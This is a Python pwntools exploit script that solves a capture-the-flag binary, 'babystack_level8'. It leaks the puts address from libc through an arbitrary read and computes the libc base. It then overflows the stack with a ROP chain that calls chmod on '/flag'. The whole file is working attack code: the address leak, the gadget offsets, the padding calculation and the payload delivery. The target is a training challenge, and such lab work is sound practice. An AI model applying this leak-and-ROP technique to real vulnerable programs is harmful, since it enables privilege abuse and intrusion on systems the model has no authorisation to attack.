import pwn
import struct
from pwn import *

def rop_chain(base):
    flag_string = b'/flag\x00ab'
    # From gadgets
    # Use ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop" 
    pop_rdi = p64(base + 0x23b6a)
    pop_rsi = p64(base + 0x2601f)
    permission_code = p64(0x7)
    chmod = p64(base + 0x10db60)

    # Put value of the flag in the buffer first (rbp), then send that value as argument to pop rdi.. then send the permission code to rsi.. finally call chmod syscall
    chain = flag_string + pop_rdi + p64(rbp) +  pop_rsi + permission_code + chmod
    return chain

def calculate_base(leaked_puts):
    puts_offset = 0x84420
    libc_base = leaked_puts - puts_offset
    return libc_base

io = pwn.process("/challenge/babystack_level8")

# rbp
io.recvuntil("rbp: ")
rbp = int(io.recvline(keepends=False),16)

# Got my doing objdump -d ./babystack_level8 | grep "puts"
arbitrary_read = 0x404020

# Send the address where puts is there to leak its value
io.recvuntil(b'(hex format)')
io.sendline(hex(arbitrary_read))

# Extract the leaked puts value
io.recvuntil(b'is: ')
leaked_puts = int(io.recvline(keepends=False), 16)
print(hex(leaked_puts))

# buff
io.recvuntil("stored: ")
buff = int(io.recvline(keepends=False),16)

# Calculate the libc base
libc_base = calculate_base(leaked_puts)

padding = rbp - buff

exploit = b'a' * padding + rop_chain(libc_base)

io.send(exploit)
io.interactive()